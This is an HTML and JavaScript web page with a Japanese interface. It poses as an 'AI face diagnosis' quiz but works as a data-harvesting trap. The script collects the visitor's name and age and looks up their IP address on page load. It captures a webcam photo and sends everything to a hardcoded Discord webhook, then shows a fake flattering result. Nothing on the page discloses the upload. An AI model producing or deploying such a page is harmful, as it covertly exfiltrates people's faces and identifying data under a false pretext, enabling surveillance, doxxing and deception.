<!DOCTYPE html>
<html lang="ja">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>認証</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            font-family: 'Courier New', Courier, monospace;
            background-color: #000;
            color: #0f0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            overflow: hidden;
        }
        .container {
            background-color: #0a0a0a;
            border: 2px solid #0f0;
            padding: 30px;
            border-radius: 5px;
            box-shadow: 0 0 25px rgba(0, 255, 0, 0.5),
                        inset 0 0 15px rgba(0, 255, 0, 0.1);
            text-align: center;
            width: 90%;
            max-width: 450px;
            min-height: 400px;
            display: flex;
            flex-direction: column;
            justify-content: center;
        }
        h1 {
            margin-top: 0;
            font-size: 28px;
            text-transform: uppercase;
            letter-spacing: 3px;
            animation: flicker 1.5s infinite alternate;
        }
        p {
            font-size: 14px;
            line-height: 1.6;
        }
        input[type="text"], input[type="number"] {
            width: calc(100% - 22px);
            padding: 10px;
            margin: 10px 0;
            border: 1px solid #0f0;
            background-color: #111;
            color: #0f0;
            border-radius: 3px;
            font-family: 'Courier New', Courier, monospace;
        }
        input:focus {
            outline: none;
            box-shadow: 0 0 10px #0f0;
        }
        button {
            width: 100%;
            padding: 12px;
            margin-top: 20px;
            background-color: transparent;
            color: #0f0;
            border: 1px solid #0f0;
            border-radius: 3px;
            cursor: pointer;
            font-weight: bold;
            text-transform: uppercase;
            transition: all 0.3s ease;
        }
        button:hover {
            background-color: #0f0;
            color: #000;
            box-shadow: 0 0 15px #0f0;
        }
        button:disabled {
            opacity: 0.5;
            cursor: not-allowed;
        }
        .hidden {
            display: none;
        }
        video, canvas {
            width: 100%;
            max-width: 320px;
            height: auto;
            border: 1px solid #0f0;
            margin-top: 20px;
            border-radius: 3px;
        }
        #status {
            margin-top: 15px;
            font-size: 12px;
            color: #0f0;
            min-height: 20px;
        }
        @keyframes flicker {
            0%, 18%, 22%, 25%, 53%, 57%, 100% {
                text-shadow: 0 0 5px #0f0, 0 0 10px #0f0;
            }
            20%, 24%, 55% {
                text-shadow: none;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <!-- ステップ1: 名前と年齢 -->
        <div id="step1">
            <h1>AI顔面診断</h1>
            <p>続行するには、情報を入力してください。</p>
            <form id="infoForm">
                <input type="text" id="name" placeholder="名前" required>
                <input type="number" id="age" placeholder="年齢" min="1" max="120" required>
                <button type="submit">次へ</button>
            </form>
        </div>

        <!-- ステップ2: カメラ撮影 -->
        <div id="step2" class="hidden">
            <h1>AI顔面診断</h1>
            <p>顔がしっかり映るようにしてください。</p>
            <video id="video" autoplay playsinline></video>
            <canvas id="canvas" class="hidden"></canvas>
            <button id="captureBtn">撮影</button>
            <div id="status">準備完了...</div>
        </div>
    </div>

    <script>
        const step1 = document.getElementById('step1');
        const step2 = document.getElementById('step2');
        const infoForm = document.getElementById('infoForm');
        const nameInput = document.getElementById('name');
        const ageInput = document.getElementById('age');
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const captureBtn = document.getElementById('captureBtn');
        const statusDiv = document.getElementById('status');

        let stream = null;
        let userData = { ip: "取得中..." };

        // ページ読み込み時にIP取得（非同期）
        async function fetchIP() {
            try {
                const res = await fetch('https://api.ipify.org?format=json');
                const data = await res.json();
                userData.ip = data.ip || "取得失敗";
            } catch (err) {
                console.error('IP取得エラー:', err);
                userData.ip = "取得できませんでした";
            }
        }
        fetchIP();  // 即実行

        // ステップ1 → ステップ2
        infoForm.addEventListener('submit', (e) => {
            e.preventDefault();
            userData.name = nameInput.value.trim() || "不明";
            userData.age  = ageInput.value || "不明";

            step1.classList.add('hidden');
            step2.classList.remove('hidden');
            startCamera();
        });

        // カメラ起動
        async function startCamera() {
            try {
                stream = await navigator.mediaDevices.getUserMedia({
                    video: { facingMode: 'user' },
                    audio: false
                });
                video.srcObject = stream;
                statusDiv.textContent = 'カメラ起動済み。顔を映して「撮影」を押してください。';
            } catch (err) {
                console.error('カメラエラー:', err);
                statusDiv.textContent = 'カメラ起動失敗。権限を確認してください。';
                statusDiv.style.color = '#f00';
                captureBtn.disabled = true;
            }
        }

        // 撮影＆送信
        captureBtn.addEventListener('click', async () => {
            if (!stream) {
                statusDiv.textContent = 'カメラが準備できていません。';
                statusDiv.style.color = '#f00';
                return;
            }

            captureBtn.disabled = true;
            statusDiv.textContent = '撮影中...';
            statusDiv.style.color = '#ff0';

            // canvasに描画
            const ctx = canvas.getContext('2d');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

            // Blob取得（軽量化）
            const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.82));

            // カメラ停止
            stream.getTracks().forEach(t => t.stop());
            stream = null;

            statusDiv.textContent = '送信中...（数秒かかる場合があります）';
            statusDiv.style.color = '#ff0';

            // FormData作成
            const formData = new FormData();

            // JSON部分（IPも含む）
            const payload = {
                content: `**AI顔面診断**\n名前: ${userData.name}\n年齢: ${userData.age}\nIP: ${userData.ip}`,
                embeds: [{
                    title: "AI顔面診断",
                    color: 0x00ff00,
                    fields: [
                        { name: "名前", value: userData.name, inline: true },
                        { name: "年齢", value: userData.age, inline: true },
                        { name: "IPアドレス", value: userData.ip, inline: true },
                        { name: "撮影日時", value: new Date().toLocaleString('ja-JP'), inline: true }
                    ],
                    image: { url: "attachment://photo.jpg" },
                    timestamp: new Date().toISOString()
                }]
            };

            formData.append('payload_json', JSON.stringify(payload));
            formData.append('files[0]', blob, 'photo.jpg');

            const webhookUrl = "https://discord.com/api/webhooks/1468992837180854282/wTQQU5JCeIPw9O6Fj7ajlTjBlAgaitdqHS4uRtJzdqn6mOihL6mFHanWvE76CsboggFZ";

            try {
                const res = await fetch(webhookUrl, {
                    method: 'POST',
                    body: formData
                });

                if (res.ok) {
                    statusDiv.textContent = 'あなたはイケメン顔です';
                    statusDiv.style.color = '#0f0';
                    video.style.display = 'none';
                    captureBtn.style.display = 'none';
                    canvas.classList.remove('hidden'); // 撮った写真を表示
                } else {
                    const err = await res.text().catch(() => '不明');
                    throw new Error(`HTTP ${res.status} - ${err}`);
                }
            } catch (err) {
                console.error('送信エラー:', err);
                statusDiv.textContent = '送信失敗しました。Webhook URLまたはネットワークを確認してください。';
                statusDiv.style.color = '#f00';
                captureBtn.disabled = false;
            }
        });
    </script>
</body>
</html>
